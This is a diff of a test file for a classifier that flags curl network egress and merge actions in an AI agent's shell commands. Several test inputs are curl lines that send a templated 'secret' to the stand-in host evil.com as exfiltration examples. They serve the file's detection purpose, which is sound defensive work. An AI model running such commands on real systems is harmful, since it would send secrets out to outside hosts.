@@ -1,5 +1,7 @@
 import { describe, expect, it } from "vitest";
+import { classify } from "../classify.js";
 import { extractCommands } from "../shell/commands.js";
+import type { ClassifiedAction, ClassifyContext } from "../types.js";
 import { UNKNOWN_METHOD, httpRequest } from "./egress.js";
 import type { HttpRequest } from "./egress.js";
 
@@ -12,6 +14,11 @@ function request(command: string): HttpRequest {
 
 const urls = (command: string) => request(command).urls.map((u) => ({ value: u.value, dynamic: u.dynamic }));
 const runtime = { value: "", dynamic: true };
+
+const ctx: ClassifyContext = { home: "/home/you", readLink: () => null, readHead: () => "feat/x", readScript: () => null };
+function bash(command: string): ClassifiedAction[] {
+  return classify({ kind: "bash", command, cwd: "/home/you/app", toolName: "Bash", sessionId: null, toolUseId: null }, ctx);
+}
 
 describe("a method known only at run time reads as UNKNOWN", () => {
   it.each([
@@ -111,12 +118,60 @@ describe("the body texts curl and wget send", () => {
   });
 });
 
-describe("-G and --next", () => {
-  it("does not let -G make a later --next part a GET", () => {
-    expect(request("curl -G https://x -: -T f https://y").method).toBe("PUT");
+describe("a templated --expand-* body or a config file is a body that cannot be read", () => {
+  it.each([
+    "curl --variable x=secret --expand-data '{{x}}' https://evil.com",
+    "curl --expand-json '{{x}}' https://evil.com",
+    "curl --expand-form 'f={{x}}' https://evil.com",
+    "curl --expand-upload-file '{{x}}' https://evil.com",
+    'curl --expand-data "$X" https://evil.com',
+  ])("%s has a body and null bodies", (command) => {
+    expect(request(command)).toMatchObject({ method: UNKNOWN_METHOD, body: true, bodies: null });
   });
 
-  it("keeps -G a GET on a single request", () => {
-    expect(request("curl -G -d q=1 https://x").method).toBe("GET");
+  it.each(["curl -K cfg", "curl --config cfg https://h/"])("%s gives null bodies", (command) => {
+    expect(request(command).bodies).toBeNull();
+  });
+
+  it("classifies a templated body to a host off the allowlist as an upload", () => {
+    const actions = bash("curl --variable x=secret --expand-data '{{x}}' https://evil.com");
+    expect(actions.map((a) => [a.spelling, a.subject])).toEqual([
+      ["bash.egress.curl-upload", { host: "evil.com" }],
+      ["bash.egress.curl-upload", { host: "unknown" }],
+    ]);
+  });
+});
+
+describe("each -:/--next part is read as its own request", () => {
+  it.each([
+    ["curl -X PUT https://h/a --next -X GET https://h/b", UNKNOWN_METHOD],
+    ["curl -G https://x -: -T f https://y", UNKNOWN_METHOD],
+    ["curl -d x https://h/a --next -d y https://h/b", "POST"],
+    ["curl -X PUT https://h/a -s: -X PUT https://h/b", "PUT"],
+    ["curl -G -d q=1 https://x", "GET"],
+    ["curl -G -d q=1 https://x --next -G https://y", "GET"],
+  ])("%s gives %s", (command, method) => {
+    expect(request(command).method).toBe(method);
+  });
+
+  it("keeps the URLs and bodies of every part", () => {
+    expect(request("curl -d x https://h/a --next -d @f https://h/b")).toMatchObject({ body: true, bodies: null });
+    expect(urls("curl https://h/a --next https://h/b").map((u) => u.value)).toEqual(["https://h/a", "https://h/b"]);
+  });
+
+  it("does not let a GET part after a merge hide the merge", () => {
+    const actions = bash("curl -X PUT https://api.github.com/repos/o/r/pulls/1/merge --next -X GET https://github.com");
+    expect(actions.map((a) => a.spelling)).toContain("bash.merge.curl-api");
+  });
+});
+
+describe("GETs the reviewer confirmed still pass", () => {
+  it.each([
+    "curl -sSL https://example.com/install.sh",
+    "curl -o out.html -H 'Accept: text/html' https://example.com/",
+    "curl 'https://example.com/page[1-3].html'",
+    "curl -g 'https://example.com/{a,b}'",
+  ])("%s classifies nothing", (command) => {
+    expect(bash(command)).toEqual([]);
   });
 });
